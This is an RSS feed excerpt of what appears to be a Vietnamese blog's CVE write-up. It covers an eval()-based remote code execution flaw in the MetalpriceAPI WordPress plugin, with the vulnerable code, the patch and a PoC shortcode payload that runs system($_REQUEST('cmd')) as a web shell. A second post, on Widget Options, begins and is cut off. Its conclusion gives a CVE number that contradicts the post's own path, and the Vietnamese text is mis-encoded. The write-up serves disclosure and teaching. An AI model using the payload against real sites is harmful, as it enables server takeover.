1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;MetalpriceAPI&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.4&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.5&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v1.1.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($attrs[&amp;#39;operation&amp;#39;])) {&#xA;    $operation = $attrs[&amp;#39;operation&amp;#39;];&#xA;    $operation = str_replace(&amp;#39;(value)&amp;#39;, $price, $operation);&#xA;    eval(&amp;#39;$price = &amp;#39; . $operation . &amp;#39;;&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gi√° tr·ªã &lt;code&gt;$attrs[&#39;operation&#39;]&lt;/code&gt; t·ª´ shortcode ƒë∆∞·ª£c ƒë∆∞·ª£c n·ªëi th·∫≥ng v√†o chu·ªói PHP r·ªìi ƒë∆∞a v√†o &lt;code&gt;eval()&lt;/code&gt;, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n m√£ PHP b·∫•t k·ª≥ =&amp;gt; RCE&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v1.1.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($attrs[&amp;#39;operation&amp;#39;])) {&#xA;    $price = $this-&amp;gt;safe_math_eval($attrs[&amp;#39;operation&amp;#39;], $price);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thay v√¨ s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; ‚Üí d√πng h√†m ri√™ng &lt;code&gt;safe_math_eval&lt;/code&gt; gi√∫p lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng th·ª±c thi code h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function safe_math_eval($expression, $value) {&#xA;    // Remove any whitespace&#xA;    $expression = preg_replace(&amp;#39;/\s&amp;#43;/&amp;#39;, &amp;#39;&amp;#39;, $expression);&#xA;&#xA;    // Only allow basic math operations, numbers, and the value keyword&#xA;    if (!preg_match(&amp;#39;/^[0-9\.\&amp;#43;\-\*\/\(\)value]&amp;#43;$/&amp;#39;, $expression)) {&#xA;        return $value;&#xA;    }&#xA;&#xA;    // Replace (value) with the actual value&#xA;    $expression = str_replace(&amp;#39;(value)&amp;#39;, $value, $expression);&#xA;&#xA;    // Use a safe evaluation method&#xA;    try {&#xA;        // Split the expression into tokens&#xA;        $tokens = preg_split(&amp;#39;/([\&amp;#43;\-\*\/\(\)])/&amp;#39;, $expression, -1, PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);&#xA;&#xA;        // Convert to Reverse Polish Notation (RPN)&#xA;        $output = array();&#xA;        $operators = array();&#xA;&#xA;        foreach ($tokens as $token) {&#xA;        if (is_numeric($token)) {&#xA;            $output[] = $token;&#xA;        } elseif ($token === &amp;#39;(&amp;#39;) {&#xA;            $operators[] = $token;&#xA;        } elseif ($token === &amp;#39;)&amp;#39;) {&#xA;            while (count($operators) &amp;gt; 0 &amp;amp;&amp;amp; end($operators) !== &amp;#39;(&amp;#39;) {&#xA;            $output[] = array_pop($operators);&#xA;            }&#xA;            if (count($operators) &amp;gt; 0 &amp;amp;&amp;amp; end($operators) === &amp;#39;(&amp;#39;) {&#xA;            array_pop($operators);&#xA;            }&#xA;        } else {&#xA;            $precedence = array(&#xA;            &amp;#39;&amp;#43;&amp;#39; =&amp;gt; 1,&#xA;            &amp;#39;-&amp;#39; =&amp;gt; 1,&#xA;            &amp;#39;*&amp;#39; =&amp;gt; 2,&#xA;            &amp;#39;/&amp;#39; =&amp;gt; 2&#xA;            );&#xA;&#xA;            while (count($operators) &amp;gt; 0 &amp;amp;&amp;amp;&#xA;                    end($operators) !== &amp;#39;(&amp;#39; &amp;amp;&amp;amp;&#xA;                    $precedence[$token] &amp;lt;= $precedence[end($operators)]) {&#xA;            $output[] = array_pop($operators);&#xA;            }&#xA;            $operators[] = $token;&#xA;        }&#xA;        }&#xA;&#xA;        while (count($operators) &amp;gt; 0) {&#xA;        $output[] = array_pop($operators);&#xA;        }&#xA;&#xA;        // Evaluate RPN&#xA;        $stack = array();&#xA;        foreach ($output as $token) {&#xA;        if (is_numeric($token)) {&#xA;            array_push($stack, $token);&#xA;        } else {&#xA;            $b = array_pop($stack);&#xA;            $a = array_pop($stack);&#xA;&#xA;            switch ($token) {&#xA;            case &amp;#39;&amp;#43;&amp;#39;:&#xA;                array_push($stack, $a &amp;#43; $b);&#xA;                break;&#xA;            case &amp;#39;-&amp;#39;:&#xA;                array_push($stack, $a - $b);&#xA;                break;&#xA;            case &amp;#39;*&amp;#39;:&#xA;                array_push($stack, $a * $b);&#xA;                break;&#xA;            case &amp;#39;/&amp;#39;:&#xA;                if ($b == 0) {&#xA;                return $value; // Division by zero&#xA;                }&#xA;                array_push($stack, $a / $b);&#xA;                break;&#xA;            }&#xA;        }&#xA;        }&#xA;&#xA;        $result = array_pop($stack);&#xA;        return is_numeric($result) ? $result : $value;&#xA;    } catch (Exception $e) {&#xA;        return $value;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω shortcode &lt;code&gt;metalpriceapi&lt;/code&gt; v·ªõi callback l√† h√†m &lt;code&gt;shortcode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode(&amp;#39;metalpriceapi&amp;#39;, [$this, &amp;#39;shortcode&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;shortcode()&lt;/code&gt;, c√°c tham s·ªë ƒë·∫ßu v√†o ƒë∆∞·ª£c l·∫•y t·ª´ shortcode th√¥ng qua &lt;code&gt;shortcode_atts()&lt;/code&gt;. Sau ƒë√≥ plugin l·∫•y &lt;code&gt;api_key&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c l∆∞u b·∫±ng &lt;code&gt;get_option()&lt;/code&gt;, x√¢y d·ª±ng URL v√† g·ª≠i request ƒë·∫øn &lt;code&gt;https://api.metalpriceapi.com&lt;/code&gt; b·∫±ng &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu ƒëƒÉng k√Ω t√†i kho·∫£n t·∫°i &lt;code&gt;metalpriceapi.com&lt;/code&gt; v√† nh·∫≠p API key v√†o ph·∫ßn Settings c·ªßa plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#34; title=&#34;Nh·∫≠p API key&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;Nh·∫≠p API key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#39; alt=&#34;API&#34; height=&#34;288&#34; width=&#34;925&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nh·∫≠p API key&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;response tr·∫£ v·ªÅ s·∫Ω c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;success&amp;#34;:true,&amp;#34;base&amp;#34;:&amp;#34;USD&amp;#34;,&amp;#34;timestamp&amp;#34;:1764633599,&amp;#34;rates&amp;#34;:{&amp;#34;USDXAU&amp;#34;:4230.2580203577,&amp;#34;XAU&amp;#34;:0.0002363922}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Body c·ªßa response ƒë∆∞·ª£c &lt;code&gt;json_decode()&lt;/code&gt; th√†nh m·∫£ng. Khi ƒëi·ªÅu ki·ªán&#xA;&lt;code&gt;isset($json[&#39;success&#39;]) &amp;amp;&amp;amp; $json[&#39;success&#39;] == true&lt;/code&gt; th·ªèa m√£n v√† shortcode c√≥ cung c·∫•p tham s·ªë &lt;code&gt;operation&lt;/code&gt;, plugin th·ª±c hi·ªán:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$operation = $attrs[&amp;#39;operation&amp;#39;];&#xA;$operation = str_replace(&amp;#39;(value)&amp;#39;, $price, $operation);&#xA;eval(&amp;#39;$price = &amp;#39; . $operation . &amp;#39;;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°i ƒë√¢y, gi√° tr·ªã &lt;code&gt;operation&lt;/code&gt; do ng∆∞·ªùi d√πng ki·ªÉm so√°t ƒë∆∞·ª£c ƒë∆∞a tr·ª±c ti·∫øp v√†o &lt;code&gt;eval()&lt;/code&gt;, d·∫´n ƒë·∫øn kh·∫£ nƒÉng th·ª±c thi m√£ PHP t√πy √Ω. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n v√† th·ª±c thi l·ªánh tr√™n m√°y ch·ªß th√¥ng qua tham s·ªë &lt;code&gt;operation&lt;/code&gt; c·ªßa shortcode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker with Contributor (or higher) role&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Creates or edits a post/content&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Inserts [metalpriceapi operation=payload]&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;WordPress renders the shortcode&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Plugin executes shortcode() function&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;operation is concatenated into a PHP expression&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;eval() executes the attacker‚Äëcontrolled input&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Remote Code Execution (RCE) on the server&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o post b·∫±ng Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Th√™m shortcode:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[metalpriceapi operation=&amp;#39;&amp;#34;abc&amp;#34;;system($_REQUEST(&amp;#34;cmd&amp;#34;));die()&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#39; alt=&#34;Result&#34; height=&#34;409&#34; width=&#34;1221&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-8672 trong plugin WordPress MetalpriceAPI (&amp;lt;= 1.1.4) l√† m·ªôt l·ªó h·ªïng RCE nghi√™m tr·ªçng do s·ª≠ d·ª•ng tr·ª±c ti·∫øp h√†m &lt;code&gt;eval()&lt;/code&gt; v·ªõi d·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t t·ª´ tham s·ªë &lt;code&gt;operation&lt;/code&gt; c·ªßa shortcode. Ch·ªâ c·∫ßn quy·ªÅn Contributor, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n v√† th·ª±c thi m√£ PHP t√πy √Ω tr√™n m√°y ch·ªß, d·∫´n ƒë·∫øn nguy c∆° chi·∫øm quy·ªÅn h·ªá th·ªëng, l√†m r√≤ r·ªâ d·ªØ li·ªáu ho·∫∑c c√†i m√£ ƒë·ªôc. Phi√™n b·∫£n 1.1.5 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch lo·∫°i b·ªè &lt;code&gt;eval()&lt;/code&gt; v√† thay th·∫ø b·∫±ng h√†m x·ª≠ l√Ω bi·ªÉu th·ª©c an to√†n h∆°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; v·ªõi d·ªØ li·ªáu ƒë·∫ßu v√†o t·ª´ ng∆∞·ªùi d√πng, d√π l√† gi√°n ti·∫øp.&lt;/li&gt;&#xA;&lt;li&gt;Shortcode trong WordPress n·∫øu kh√¥ng ki·ªÉm so√°t ch·∫∑t ch·∫Ω c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm v√†o c·ªßa RCE.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn lu√¥n ki·ªÉm tra, l·ªçc v√† gi·ªõi h·∫°n k√Ω t·ª± h·ª£p l·ªá c·ªßa tham s·ªë ƒë·∫ßu v√†o.&lt;/li&gt;&#xA;&lt;li&gt;N√™n s·ª≠ d·ª•ng b·ªô ph√¢n t√≠ch c√∫ ph√°p (parser) ho·∫∑c h√†m x·ª≠ l√Ω ri√™ng thay v√¨ th·ª±c thi tr·ª±c ti·∫øp bi·ªÉu th·ª©c ƒë·ªông.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/metalpriceapi/vulnerability/wordpress-metalpriceapi-1-1-4-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin &amp;lt;= 1.1.4 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-04-cve-2024-8672/</link>
      <pubDate>Thu, 04 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-04-cve-2024-8672/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;The Widget Options ‚Äì The #1 WordPress Widget &amp;amp; Block Control Plugin&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;Remote Code Execution&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, &lt;strong&gt;4.0.7&lt;/strong&gt; th√¥ng qua ch·ª©c nƒÉng &lt;strong&gt;display logic&lt;/strong&gt; m·ªü r·ªông cho nhi·ªÅu &lt;strong&gt;page builders&lt;/strong&gt;, do plugin cho ph√©p input ƒëi qua &lt;strong&gt;eval()&lt;/strong&gt; m√† kh√¥ng c√≥ l·ªçc hay ki·ªÉm tra capability, khi·∫øn k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c v·ªõi quy·ªÅn &lt;strong&gt;contributor-level access&lt;/strong&gt; tr·ªü l√™n c√≥ th·ªÉ th·ª±c thi code tr√™n server; m·∫∑c d√π ƒë√£ ƒë∆∞·ª£c &lt;strong&gt;patched&lt;/strong&gt;, v·∫•n ƒë·ªÅ v·∫´n ti·ªÅm ·∫©n r·ªßi ro d∆∞ th·ª´a v√¨ ch∆∞a ƒë∆∞·ª£c gia c·ªë ƒë·∫ßy ƒë·ªß.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 